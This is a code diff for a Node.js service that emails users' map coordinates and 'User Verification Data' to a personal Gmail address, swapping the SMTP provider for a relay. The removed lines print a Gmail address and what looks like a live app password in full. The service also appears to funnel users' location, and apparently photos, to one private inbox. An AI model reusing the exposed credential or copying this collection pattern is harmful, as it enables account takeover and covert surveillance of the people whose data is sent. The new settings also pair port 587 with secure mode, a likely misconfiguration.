@@ -7,17 +7,17 @@ export class CollectService {
     const mapLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
 
     const transporter = nodemailer.createTransport({
-      host: 'smtp.gmail.com',
-      port: 465,
+      host: 'smtp-relay.brevo.com',
+      port: 587,
       secure: true,
       auth: {
-        user: "kumawatmanish686@gmail.com",
-        pass: "itktaibmxitwovxp",
+        user: process.env.SMTP_USER,
+        pass: process.env.SMTP_PASS,
       },
     });
 
     await transporter.sendMail({
-      from: "kumawatmanish686@gmail.com",
+      from: process.env.SMTP_USER,
       to: "kumawatmanish686@gmail.com",
       subject: '📸 User Verification Data',
       text: `
